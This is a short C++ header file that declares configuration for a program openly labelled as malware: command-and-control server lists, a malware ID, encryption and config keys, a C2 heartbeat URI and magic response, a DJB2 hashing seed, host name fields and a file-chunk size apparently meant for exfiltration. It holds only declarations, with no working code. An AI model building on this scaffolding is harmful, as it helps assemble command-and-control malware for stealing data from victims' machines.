#pragma once
#ifndef __SETTINGS_H__
#define __SETTINGS_H__
#include <vector>
#include <string>

// chunk size does not include metadata. This is strictly for setting the file data chunks.
#define MAX_CHUNK_SIZE 30720

namespace settings {

    extern std::vector<unsigned char> key;

    extern std::vector<unsigned char> configKey;

    extern std::string config_path;

    extern std::vector<std::string> C2_SERVERS;

    extern std::string malware_id;

    extern std::string DJB2_SEED;

    extern std::string C2_HEARTBEAT_URI;

    extern std::string C2_HEARTBEAT_MAGIC_RESPONSE;

    namespace environment {
        extern std::string computerName;

        extern std::string domainName;
    }

}

#endif